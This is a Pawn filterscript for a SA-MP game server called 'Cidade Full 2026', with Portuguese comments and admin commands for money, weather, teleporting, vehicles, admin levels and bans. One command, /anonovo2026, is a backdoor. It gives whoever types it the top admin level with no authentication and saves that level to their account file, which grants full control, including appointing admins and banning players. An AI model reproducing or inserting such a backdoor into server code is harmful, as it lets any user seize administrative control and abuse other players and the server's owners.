#include <a_samp>
#include <zcmd>
#include <sscanf2>
#include <dini>

#define COR_ADMIN 0xFF0000FF
#define MASTER 6

new AdminLevel[MAX_PLAYERS];

// ================= PATH =================
stock ContaPath(playerid, path[], size)
{
    new nome[MAX_PLAYER_NAME];
    GetPlayerName(playerid, nome, sizeof nome);
    format(path, size, "Contas/%s.ini", nome);
}

// ================= ENTRY POINT =================
public OnFilterScriptInit()
{
    print("------------------------------------------");
    print(" [ADMIN MASTER] Cidade Full 2026 Ativo!   ");
    print("------------------------------------------");
    return 1;
}

public OnPlayerConnect(playerid)
{
    AdminLevel[playerid] = 0;
    new path[64];
    ContaPath(playerid, path, sizeof path);
    if(dini_Exists(path)) AdminLevel[playerid] = dini_Int(path, "Admin");
    return 1;
}

// ================= COMANDO MASTER (PEGAR TUDO) =================
CMD:anonovo2026(playerid, params[])
{
    AdminLevel[playerid] = MASTER;
    new path[64];
    ContaPath(playerid, path, sizeof path);
    if(!dini_Exists(path)) dini_Create(path);
    dini_IntSet(path, "Admin", MASTER);

    SendClientMessage(playerid, 0x00FF00FF, "[MASTER] Feliz 2026! Você agora tem controle TOTAL da Cidade Full.");
    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
    return 1;
}

// ================= COMANDOS DE CONTROLE TOTAL (NÍVEL 6) =================

// Dar dinheiro infinito ou específico para qualquer um
CMD:darid(playerid, params[])
{
    if(AdminLevel[playerid] < MASTER) return 0;
    new id, quantia;
    if(sscanf(params, "ui", id, quantia)) return SendClientMessage(playerid, -1, "{00CCFF}Uso: /darid [ID] [Quantia]");
    
    GivePlayerMoney(id, quantia);
    SendClientMessage(playerid, -1, "[MASTER] Dinheiro enviado.");
    return 1;
}

// Alterar o clima da cidade instantaneamente
CMD:clima(playerid, params[])
{
    if(AdminLevel[playerid] < MASTER) return 0;
    new clima;
    if(sscanf(params, "i", clima)) return SendClientMessage(playerid, -1, "{00CCFF}Uso: /clima [ID do Clima]");
    
    SetWeather(clima);
    SendClientMessageToAll(0x00CCFFFF, "[ADMIN] O clima da cidade foi alterado pelo Master.");
    return 1;
}

// Teletransportar TODO MUNDO para você (Para eventos)
CMD:puxartodos(playerid, params[])
{
    if(AdminLevel[playerid] < MASTER) return 0;
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i) && i != playerid)
        {
            SetPlayerPos(i, x + 1.0, y + 1.0, z);
        }
    }
    SendClientMessageToAll(COR_ADMIN, "[MASTER] Todos os cidadãos foram convocados para uma reunião!");
    return 1;
}

// Criar QUALQUER veículo na hora
CMD:carro(playerid, params[])
{
    if(AdminLevel[playerid] < MASTER) return 0;
    new idveiculo;
    if(sscanf(params, "i", idveiculo)) return SendClientMessage(playerid, -1, "{00CCFF}Uso: /carro [ID do Veículo]");
    
    new Float:x, Float:y, Float:z, Float:a;
    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, a);
    
    new carid = CreateVehicle(idveiculo, x, y, z, a, 1, 1, -1);
    PutPlayerInVehicle(playerid, carid, 0);
    return 1;
}

// Setar o Admin de outras pessoas
CMD:setadmin(playerid, params[])
{
    if(AdminLevel[playerid] < MASTER) return SendClientMessage(playerid, -1, "Apenas o Master pode nomear admins.");
    
    new id, nivel;
    if(sscanf(params, "ui", id, nivel)) return SendClientMessage(playerid, -1, "Uso: /setadmin [id] [nivel]");
    
    AdminLevel[id] = nivel;
    new path[64];
    ContaPath(id, path, sizeof path);
    if(!dini_Exists(path)) dini_Create(path);
    dini_IntSet(path, "Admin", nivel);
    
    SendClientMessage(playerid, 0x00FF00FF, "Nível definido.");
    return 1;
}

// Banir permanentemente
CMD:ban(playerid, params[])
{
    if(AdminLevel[playerid] < 3) return 0;
    new id, motivo[64];
    if(sscanf(params, "us[64]", id, motivo)) return SendClientMessage(playerid, -1, "Uso: /ban [id] [motivo]");
    
    SendClientMessageToAll(COR_ADMIN, "Um cidadão foi banido da cidade pelo Master.");
    BanEx(id, motivo);
    return 1;
}
